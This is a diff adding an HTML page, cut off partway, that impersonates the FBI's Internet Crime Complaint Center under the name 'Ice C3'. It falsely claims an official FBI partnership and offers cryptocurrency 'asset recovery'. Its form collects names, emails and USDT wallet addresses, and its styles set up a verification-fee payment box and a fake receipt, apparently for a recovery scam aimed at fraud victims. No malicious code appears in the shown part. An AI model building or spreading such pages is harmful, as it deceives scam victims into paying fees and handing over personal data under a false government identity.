@@ -1,0 +1,1875 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ice C3 - International Cyber Crime Complaint Center</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            color: #333;
+        }
+
+        .main-container {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Navigation Bar */
+        .navbar {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .nav-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 70px;
+        }
+
+        .logo-section {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-img {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            border: 2px solid #667eea;
+            object-fit: cover;
+        }
+
+        .logo-text {
+            font-size: 1.5em;
+            font-weight: 700;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .nav-links {
+            display: flex;
+            list-style: none;
+            gap: 30px;
+        }
+
+        .nav-links a {
+            color: #333;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s ease;
+            position: relative;
+        }
+
+        .nav-links a:hover {
+            color: #667eea;
+        }
+
+        .nav-links a::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            transition: width 0.3s ease;
+        }
+
+        .nav-links a:hover::after {
+            width: 100%;
+        }
+
+        /* Container */
+        .container {
+            flex: 1;
+            max-width: 1100px;
+            margin: 40px auto;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+            width: 90%;
+        }
+
+        /* Header Section */
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 60px 40px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 500px;
+            height: 500px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+        }
+
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: -50%;
+            left: -50%;
+            width: 400px;
+            height: 400px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+        }
+
+        .logo-placeholder {
+            position: relative;
+            z-index: 1;
+            margin-bottom: 30px;
+        }
+
+        .main-logo {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            background: rgba(255, 255, 255, 0.1);
+            padding: 5px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        }
+
+        .header h1 {
+            font-size: 3.5em;
+            margin: 20px 0 10px 0;
+            letter-spacing: 3px;
+            position: relative;
+            z-index: 1;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .header h2 {
+            font-size: 1.8em;
+            font-weight: 300;
+            opacity: 0.95;
+            position: relative;
+            z-index: 1;
+            margin-bottom: 10px;
+        }
+
+        .header-subtitle {
+            font-size: 1.1em;
+            opacity: 0.85;
+            position: relative;
+            z-index: 1;
+            font-weight: 300;
+        }
+
+        /* Divider */
+        .divider {
+            height: 1px;
+            background: linear-gradient(to right, transparent, #e0e0e0, transparent);
+        }
+
+        /* Section Header */
+        .section-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .section-header h2 {
+            font-size: 2.2em;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .section-subtitle {
+            color: #999;
+            font-size: 1.1em;
+            font-weight: 300;
+        }
+
+        /* Info Section */
+        .info-section {
+            padding: 50px 40px;
+            background: #f8f9fa;
+        }
+
+        .info-content {
+            margin-top: 30px;
+        }
+
+        .info-text {
+            margin-bottom: 40px;
+        }
+
+        .info-text p {
+            color: #666;
+            line-height: 1.8;
+            font-size: 1.05em;
+            margin-bottom: 20px;
+            text-align: justify;
+        }
+
+        .info-text h3 {
+            font-size: 1.4em;
+            color: #333;
+            margin: 30px 0 15px 0;
+        }
+
+        .services-list {
+            list-style: none;
+            padding: 0;
+        }
+
+        .services-list li {
+            padding: 12px 0;
+            padding-left: 30px;
+            position: relative;
+            color: #666;
+            line-height: 1.6;
+            font-size: 1.05em;
+        }
+
+        .services-list li::before {
+            content: '✓';
+            position: absolute;
+            left: 0;
+            color: #667eea;
+            font-weight: bold;
+            font-size: 1.3em;
+        }
+
+        .info-cards {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-top: 30px;
+        }
+
+        .info-card {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
+            text-align: center;
+            transition: all 0.3s ease;
+            border-top: 4px solid #667eea;
+        }
+
+        .info-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
+        }
+
+        .card-icon {
+            font-size: 2.5em;
+            color: #667eea;
+            margin-bottom: 15px;
+        }
+
+        .info-card h4 {
+            font-size: 1.3em;
+            color: #333;
+            margin-bottom: 12px;
+        }
+
+        .info-card p {
+            color: #666;
+            line-height: 1.6;
+            font-size: 0.95em;
+        }
+
+        /* Form Section */
+        .form-section {
+            padding: 50px 40px;
+        }
+
+        .recovery-form {
+            margin-top: 30px;
+        }
+
+        .form-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 25px;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 10px;
+            color: #333;
+            font-weight: 600;
+            font-size: 1em;
+        }
+
+        .form-group label i {
+            color: #667eea;
+            font-size: 1.1em;
+        }
+
+        .form-group input,
+        .form-group select {
+            padding: 14px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 1em;
+            transition: all 0.3s ease;
+            font-family: inherit;
+            background: white;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
+            background: #fafafa;
+        }
+
+        .form-group input:invalid {
+            border-color: #e74c3c;
+        }
+
+        .form-helper {
+            display: block;
+            margin-top: 6px;
+            color: #999;
+            font-size: 0.9em;
+        }
+
+        .form-error {
+            display: block;
+            color: #e74c3c;
+            font-size: 0.9em;
+            margin-top: 5px;
+            min-height: 18px;
+        }
+
+        .form-actions {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .verify-btn {
+            flex: 1;
+            padding: 16px 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .verify-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(102, 126, 234, 0.6);
+        }
+
+        .verify-btn:active {
+            transform: translateY(0);
+        }
+
+        .form-info {
+            background: #e8f5e9;
+            padding: 15px 20px;
+            border-radius: 8px;
+            border-left: 4px solid #2ecc71;
+            color: #333;
+            font-size: 0.95em;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .form-info i {
+            color: #2ecc71;
+            font-size: 1.2em;
+            flex-shrink: 0;
+        }
+
+        /* No Recovery Section */
+        .no-recovery-section {
+            padding: 40px;
+        }
+
+        .alert {
+            padding: 25px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            display: flex;
+            gap: 20px;
+        }
+
+        .alert-warning {
+            background: #fff8e1;
+            border-left: 4px solid #f39c12;
+        }
+
+        .alert-icon {
+            font-size: 2em;
+            color: #f39c12;
+            flex-shrink: 0;
+        }
+
+        .alert-content h3 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 1.3em;
+        }
+
+        .alert-content p {
+            color: #666;
+            margin-bottom: 10px;
+            line-height: 1.6;
+        }
+
+        .alert-detail {
+            font-weight: 600;
+            margin-top: 15px;
+        }
+
+        .alert-list {
+            list-style: none;
+            padding-left: 0;
+            margin-top: 10px;
+        }
+
+        .alert-list li {
+            padding: 8px 0;
+            padding-left: 24px;
+            position: relative;
+            color: #666;
+        }
+
+        .alert-list li::before {
+            content: '•';
+            position: absolute;
+            left: 8px;
+            color: #f39c12;
+            font-weight: bold;
+        }
+
+        /* Duties Section */
+        .duties-section {
+            margin: 40px 0;
+        }
+
+        .duties-section h3 {
+            font-size: 1.6em;
+            color: #333;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        .duties-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+        }
+
+        .duty-card {
+            background: linear-gradient(135deg, #667eea15 0%, #764ba215 100%);
+            padding: 25px;
+            border-radius: 10px;
+            border: 1px solid #667eea30;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+
+        .duty-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.2);
+            border-color: #667eea;
+        }
+
+        .duty-number {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border-radius: 50%;
+            font-size: 1.5em;
+            font-weight: bold;
+            margin: 0 auto 15px;
+        }
+
+        .duty-card h4 {
+            color: #333;
+            font-size: 1.1em;
+            margin-bottom: 10px;
+        }
+
+        .duty-card p {
+            color: #666;
+            font-size: 0.9em;
+            line-height: 1.5;
+        }
+
+        /* Verification Fee Section */
+        .verification-fee-section {
+            background: #f8f9fa;
+            padding: 30px;
+            border-radius: 10px;
+            margin: 30px 0;
+        }
+
+        .verification-fee-section h3 {
+            font-size: 1.5em;
+            color: #333;
+            margin-bottom: 25px;
+        }
+
+        .fee-card {
+            display: grid;
+            grid-template-columns: 1fr 350px;
+            gap: 25px;
+            margin-bottom: 30px;
+        }
+
+        .fee-details {
+            background: white;
+            padding: 25px;
+            border-radius: 8px;
+            border-left: 4px solid #667eea;
+        }
+
+        .fee-description {
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            font-size: 1em;
+        }
+
+        .fee-amount-box {
+            background: linear-gradient(135deg, #667eea15, #764ba215);
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid #667eea30;
+        }
+
+        .fee-label {
+            color: #666;
+            font-weight: 600;
+        }
+
+        .fee-value {
+            font-size: 1.5em;
+            color: #667eea;
+            font-weight: 700;
+        }
+
+        .fee-explanation {
+            color: #333;
+            font-weight: 600;
+            margin: 20px 0 10px 0;
+        }
+
+        .fee-list {
+            list-style: none;
+            padding: 0;
+            margin-bottom: 20px;
+        }
+
+        .fee-list li {
+            padding: 10px 0;
+            padding-left: 24px;
+            position: relative;
+            color: #666;
+            font-size: 0.95em;
+            line-height: 1.5;
+        }
+
+        .fee-list li::before {
+            content: '✓';
+            position: absolute;
+            left: 0;
+            color: #2ecc71;
+            font-weight: bold;
+        }
+
+        .fee-payment-box {
+            background: #fff8e1;
+            padding: 20px;
+            border-radius: 8px;
+            border-left: 4px solid #f39c12;
+        }
+
+        .fee-instruction {
+            color: #333;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+
+        .fee-address {
+            background: white;
+            padding: 15px;
+            border-radius: 6px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+            border: 1px solid #e0e0e0;
+            gap: 10px;
+        }
+
+        .fee-address code {
+            color: #667eea;
+            font-weight: 600;
+            font-size: 0.9em;
+            word-break: break-all;
+            flex: 1;
+        }
+
+        .copy-btn {
+            padding: 8px 12px;
+            background: #667eea;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.85em;
+            transition: all 0.3s ease;
+            white-space: nowrap;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .copy-btn:hover {
+            background: #764ba2;
+        }
+
+        .fee-note {
+            color: #666;
+            font-size: 0.9em;
+            line-height: 1.5;
+        }
+
+        .fee-info-box {
+            background: linear-gradient(135deg, #2ecc7115, #27ae6015);
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid #2ecc7130;
+        }
+
+        .fee-info-box h4 {
+            color: #27ae60;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .fee-info-box p {
+            color: #666;
+            line-height: 1.6;
+            font-size: 0.95em;
+        }
+
+        /* Dashboard Section */
+        .dashboard-section {
+            padding: 40px;
+        }
+
+        /* Receipt Container */
+        .receipt-container {
+            margin-bottom: 40px;
+        }
+
+        .receipt {
+            background: white;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            padding: 40px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .receipt-header {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid #e0e0e0;
+        }
+
+        .receipt-logo {
+            flex-shrink: 0;
+        }
+
+        .receipt-logo img {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 2px solid #667eea;
+        }
+
+        .receipt-title h2 {
+            color: #333;
+            font-size: 1.8em;
+            margin: 0 0 5px 0;
+            letter-spacing: 1px;
+        }
+
+        .receipt-title p {
+            color: #999;
+            font-size: 0.95em;
+            margin: 0;
+        }
+
+        .receipt-divider {
+            height: 1px;
+            background: linear-gradient(to right, transparent, #e0e0e0, transparent);
+            margin: 25px 0;
+        }
+
+        .receipt-section {
+            margin-bottom: 25px;
+        }
+
+        .receipt-section h3 {
+            color: #333;
+            font-size: 1.1em;
+            font-weight: 700;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .receipt-details {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .receipt-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 15px;
+            background: #f8f9fa;
+            border-radius: 6px;
+            margin-bottom: 8px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .receipt-row:nth-child(even) {
+            background: white;
+            border: 1px solid #e0e0e0;
+        }
+
+        .receipt-label {
+            color: #666;
+            font-weight: 600;
+            min-width: 150px;
+        }
+
+        .receipt-value {
+            color: #333;
+            font-weight: 500;
+            text-align: right;
+            flex: 1;
+            word-break: break-word;
+        }
+
+        .status-confirmed {
+            color: #2ecc71 !important;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .address-highlight {
+            background: #f0f4ff;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+        }
+
+        /* Amount Box */
+        .amount-box {
+            background: linear-gradient(135deg, #667eea15, #764ba215);
+            padding: 30px;
+            border-radius: 8px;
+            border: 2px solid #667eea30;
+        }
+
+        .amount-main {
+            display: flex;
+            align-items: baseline;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .amount-value {
+            font-size: 2.5em;
+            font-weight: 700;
+            color: #667eea;
+        }
+
+        .amount-currency {
+            font-size: 1.3em;
+            color: #333;
+            font-weight: 600;
+        }
+
+        .amount-equivalent {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding-top: 15px;
+            border-top: 1px solid #667eea30;
+        }
+
+        .amount-label {
+            color: #666;
+            font-weight: 600;
+        }
+
+        .amount-value-equiv {
+            font-size: 1.5em;
+            color: #764ba2;
+            font-weight: 700;
+        }
+
+        /* Status Timeline */
+        .status-timeline {
+            display: flex;
+            flex-direction: column;
+            gap: 0;
+        }
+
+        .status-item {
+            display: flex;
+            gap: 20px;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 0;
+            border-left: 4px solid #ddd;
+            position: relative;
+        }
+
+        .status-item.completed {
+            border-left-color: #2ecc71;
+            background: #f0fdf4;
+        }
+
+        .status-item.active {
+            border-left-color: #f39c12;
+            background: #fffbf0;
+        }
+
+        .status-item:first-child {
+            border-radius: 6px 6px 0 0;
+        }
+
+        .status-item:last-child {
+            border-radius: 0 0 6px 6px;
+        }
+
+        .status-dot {
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            background: #ddd;
+            border: 3px solid white;
+            flex-shrink: 0;
+            margin-top: 4px;
+        }
+
+        .status-item.completed .status-dot {
+            background: #2ecc71;
+        }
+
+        .status-item.active .status-dot {
+            background: #f39c12;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.2);
+            }
+        }
+
+        .status-text strong {
+            color: #333;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .status-text p {
+            color: #666;
+            font-size: 0.9em;
+            margin: 0;
+        }
+
+        /* Receipt Footer */
+        .receipt-footer {
+            text-align: center;
+            padding-top: 20px;
+            border-top: 2px solid #e0e0e0;
+        }
+
+        .receipt-footer p {
+            color: #666;
+            font-size: 0.9em;
+            margin: 8px 0;
+        }
+
+        .receipt-security {
+            color: #2ecc71;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        /* Dashboard Stats */
+        .dashboard-stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 20px;
+            margin: 40px 0;
+        }
+
+        .stat-card {
+            background: linear-gradient(135deg, #667eea15, #764ba215);
+            padding: 25px;
+            border-radius: 10px;
+            border: 1px solid #667eea30;
+            display: flex;
+            gap: 15px;
+        }
+
+        .stat-icon {
+            font-size: 2.5em;
+            color: #667eea;
+            flex-shrink: 0;
+        }
+
+        .stat-info h4 {
+            color: #666;
+            font-size: 0.9em;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        .stat-value {
+            font-size: 1.8em;
+            color: #333;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+
+        .stat-label {
+            color: #999;
+            font-size: 0.85em;
+        }
+
+        /* Action Buttons */
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 30px;
+        }
+
+        .download-btn,
+        .back-btn,
+        .help-btn {
+            flex: 1;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .download-btn {
+            background: linear-gradient(135deg, #2ecc71 0%, #27ae60 100%);
+            color: white;
+            box-shadow: 0 4px 15px rgba(46, 204, 113, 0.3);
+        }
+
+        .download-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(46, 204, 113, 0.5);
+        }
+
+        .back-btn {
+            background: #667eea;
+            color: white;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
+        }
+
+        .back-btn:hover {
+            background: #764ba2;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.5);
+        }
+
+        .help-btn {
+            background: white;
+            color: #667eea;
+            border: 2px solid #667eea;
+        }
+
+        .help-btn:hover {
+            background: #667eea;
+            color: white;
+        }
+
+        /* Footer */
+        .footer {
+            background: #333;
+            color: white;
+            text-align: center;
+            padding: 30px 20px;
+            margin-top: auto;
+        }
+
+        .footer-content p {
+            margin: 8px 0;
+            font-size: 0.95em;
+            opacity: 0.9;
+        }
+
+        .footer-security {
+            color: #2ecc71;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 1024px) {
+            .container {
+                margin: 20px auto;
+                border-radius: 15px;
+            }
+
+            .header {
+                padding: 40px 30px;
+            }
+
+            .header h1 {
+                font-size: 2.5em;
+            }
+
+            .receipt {
+                padding: 25px;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .nav-links {
+                gap: 15px;
+            }
+
+            .header {
+                padding: 30px 20px;
+            }
+
+            .header h1 {
+                font-size: 2em;
+            }
+
+            .header h2 {
+                font-size: 1.3em;
+            }
+
+            .main-logo {
+                width: 120px;
+                height: 120px;
+            }
+
+            .logo-placeholder {
+                margin-bottom: 20px;
+            }
+
+            .container {
+                margin: 15px auto;
+                border-radius: 10px;
+            }
+
+            .info-section,
+            .form-section,
+            .dashboard-section,
+            .no-recovery-section {
+                padding: 30px 20px;
+            }
+
+            .form-grid {
+                grid-template-columns: 1fr;
+                gap: 20px;
+            }
+
+            .info-cards {
+                grid-template-columns: 1fr;
+            }
+
+            .duties-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .receipt {
+                padding: 20px;
+                border-radius: 8px;
+            }
+
+            .receipt-header {
+                flex-direction: column;
+                text-align: center;
+                gap: 15px;
+            }
+
+            .receipt-row {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 8px;
+            }
+
+            .receipt-value {
+                text-align: left;
+                width: 100%;
+            }
+
+            .action-buttons {
+                flex-direction: column;
+                gap: 10px;
+            }
+
+            .download-btn,
+            .back-btn,
+            .help-btn {
+                width: 100%;
+            }
+
+            .alert {
+                flex-direction: column;
+            }
+
+            .amount-box {
+                padding: 20px;
+            }
+
+            .amount-value {
+                font-size: 2em;
+            }
+
+            .status-timeline {
+                gap: 0;
+            }
+
+            .status-item {
+                padding: 15px;
+                gap: 15px;
+            }
+
+            .fee-address {
+                flex-direction: column;
+            }
+
+            .copy-btn {
+                width: 100%;
+            }
+
+            .dashboard-stats {
+                grid-template-columns: 1fr;
+            }
+
+            .section-header h2 {
+                font-size: 1.6em;
+            }
+
+            .fee-card {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header h1 {
+                font-size: 1.6em;
+                letter-spacing: 1px;
+            }
+
+            .info-section,
+            .form-section,
+            .dashboard-section,
+            .no-recovery-section {
+                padding: 20px 15px;
+            }
+
+            .receipt-header {
+                padding-bottom: 15px;
+            }
+
+            .receipt-logo img {
+                width: 60px;
+                height: 60px;
+            }
+
+            .receipt-title h2 {
+                font-size: 1.3em;
+            }
+
+            .verify-btn {
+                font-size: 1em;
+                padding: 14px 16px;
+            }
+
+            .nav-links {
+                gap: 10px;
+                font-size: 0.9em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <!-- Navigation Bar -->
+        <nav class="navbar">
+            <div class="nav-container">
+                <div class="logo-section">
+                    <img src="https://via.placeholder.com/60/667eea/ffffff?text=IC3" alt="Ice C3 Logo" class="logo-img">
+                    <span class="logo-text">Ice C3</span>
+                </div>
+                <ul class="nav-links">
+                    <li><a href="#home">Home</a></li>
+                    <li><a href="#about">About IC3</a></li>
+                    <li><a href="#recovery">Recovery</a></li>
+                </ul>
+            </div>
+        </nav>
+
+        <!-- Main Container -->
+        <div class="container" id="home">
+            <!-- Header Section with Logo -->
+            <div class="header">
+                <div class="logo-placeholder">
+                    <img src="https://via.placeholder.com/150/667eea/ffffff?text=IC3+LOGO" alt="Ice C3 Logo" class="main-logo">
+                </div>
+                <h1>Ice C3</h1>
+                <h2>International Cyber Crime Complaint Center</h2>
+                <p class="header-subtitle">Appointment Recovery & Asset Recovery Service</p>
+            </div>
+
+            <!-- Divider -->
+            <div class="divider"></div>
+
+            <!-- IC3 Information Section -->
+            <div class="info-section" id="about">
+                <div class="section-header">
+                    <h2>About IC3</h2>
+                    <p class="section-subtitle">Understanding the Internet Crime Complaint Center</p>
+                </div>
+
+                <div class="info-content">
+                    <div class="info-text">
+                        <p><strong>IC3 (Internet Crime Complaint Center)</strong> is an official partnership between the Federal Bureau of Investigation (FBI), the National White Collar Crime Center (NW3C), and the Bureau of Justice Assistance (BJA).</p>
+                        
+                        <p>IC3 serves as the nation's central hub for reporting and investigating internet-enabled crime. We work tirelessly to protect citizens from cyber fraud, identity theft, cryptocurrency scams, and financial crimes.</p>
+
+                        <h3>Our Core Services</h3>
+                        <ul class="services-list">
+                            <li><strong>Crime Reporting:</strong> Secure and encrypted reporting of internet crimes</li>
+                            <li><strong>Asset Recovery:</strong> Assistance in recovering lost cryptocurrency and digital assets</li>
+                            <li><strong>Investigation Support:</strong> Coordination with law enforcement agencies worldwide</li>
+                            <li><strong>Victim Assistance:</strong> Comprehensive support for fraud victims</li>
+                            <li><strong>Prevention Education:</strong> Resources to prevent future cyber crimes</li>
+                        </ul>
+                    </div>
+
+                    <div class="info-cards">
+                        <div class="info-card card-mission">
+                            <div class="card-icon">
+                                <i class="fas fa-shield-alt"></i>
+                            </div>
+                            <h4>Our Mission</h4>
+                            <p>Provide a secure platform for reporting internet crime and coordinating recovery efforts to protect citizens and their assets.</p>
+                        </div>
+
+                        <div class="info-card card-security">
+                            <div class="card-icon">
+                                <i class="fas fa-lock"></i>
+                            </div>
+                            <h4>Security First</h4>
+                            <p>All information is encrypted with military-grade security and protected under federal privacy laws.</p>
+                        </div>
+
+                        <div class="info-card card-recovery">
+                            <div class="card-icon">
+                                <i class="fas fa-coins"></i>
+                            </div>
+                            <h4>Recovery Services</h4>
+                            <p>Specialized recovery protocols for cryptocurrency theft and digital asset recovery through legitimate channels.</p>
+                        </div>
+
+                        <div class="info-card card-support">
+                            <div class="card-icon">
+                                <i class="fas fa-headset"></i>
+                            </div>
+                            <h4>24/7 Support</h4>
+                            <p>Round-the-clock assistance from trained professionals dedicated to helping crime victims.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Divider -->
+            <div class="divider"></div>
+
+            <!-- Verification Form Section -->
+            <div class="form-section" id="recovery">
+                <div class="section-header">
+                    <h2>Initiate Appointment Recovery</h2>
+                    <p class="section-subtitle">Complete verification to check your recovery status</p>
+                </div>
+
+                <form id="recoveryForm" class="recovery-form">
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label for="name">
+                                <i class="fas fa-user"></i> Full Name
+                            </label>
+                            <input 
+                                type="text" 
+                                id="name" 
+                                name="name" 
+                                placeholder="Enter your full name" 
+                                required
+                            >
+                            <span class="form-error" id="nameError"></span>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="email">
+                                <i class="fas fa-envelope"></i> Email Address
+                            </label>
+                            <input 
+                                type="email" 
+                                id="email" 
+                                name="email" 
+                                placeholder="Enter your email address" 
+                                required
+                            >
+                            <span class="form-error" id="emailError"></span>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="usdtAddress">
+                                <i class="fas fa-wallet"></i> USDT Address (TRC-20)
+                            </label>
+                            <input 
+                                type="text" 
+                                id="usdtAddress" 
+                                name="usdtAddress" 
+                                placeholder="E.g., TKVwcWjCUrZTopBPN5Gf4AiPXxqfzuUniH" 
+                                required
+                            >
+                            <span class="form-error" id="addressError"></span>
+                            <small class="form-helper">Must be a valid Tron (TRC-20) address starting with 'T'</small>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="country">
+                                <i class="fas fa-globe"></i> Country
+                            </label>
+                            <select id="country" name="country" required>
+                                <option value="">Select your country</option>
+                                <option value="US">🇺🇸 United States</option>
+                                <option value="UK">🇬🇧 United Kingdom</option>
+                                <option value="CA">🇨🇦 Canada</option>
+                                <option value="AU">🇦🇺 Australia</option>
+                                <option value="DE">🇩🇪 Germany</option>
+                                <option value="FR">🇫🇷 France</option>
+                                <option value="JP">🇯🇵 Japan</option>
+                                <option value="IN">🇮🇳 India</option>
+                                <option value="BR">🇧🇷 Brazil</option>
+                                <option value="MX">🇲🇽 Mexico</option>
+                                <option value="SG">🇸🇬 Singapore</option>
+                                <option value="HK">🇭🇰 Hong Kong</option>
+                                <option value="ZA">🇿🇦 South Africa</option>
+                                <option value="NZ">🇳🇿 New Zealand</option>
+                                <option value="CH">🇨🇭 Switzerland</option>
+                                <option value="NL">🇳🇱 Netherlands</option>
+                                <option value="SE">🇸🇪 Sweden</option>
+                                <option value="other">Other</option>
+                            </select>
+                            <span class="form-error" id="countryError"></span>
+                        </div>
+                    </div>
+
+                    <div class="form-actions">
+                        <button type="submit" class="verify-btn">
+                            <i class="fas fa-check-circle"></i> Verify & Check Recovery Status
+                        </button>
+                    </div>
+
+                    <div class="form-info">
+                        <p><i class="fas fa-info-circle"></i> Your information is encrypted and secure. It will only be used for recovery verification purposes.</p>
+                    </div>
+                </form>
+            </div>
+
+            <!-- No Recovery Found Section (Hidden) -->
+            <div class="no-recovery-section" id="noRecoverySection" style="display: none;">
+                <div class="section-header">
+                    <h2>Recovery Status</h2>
+                </div>
+
+                <div class="alert alert-warning">
+                    <div class="alert-icon">
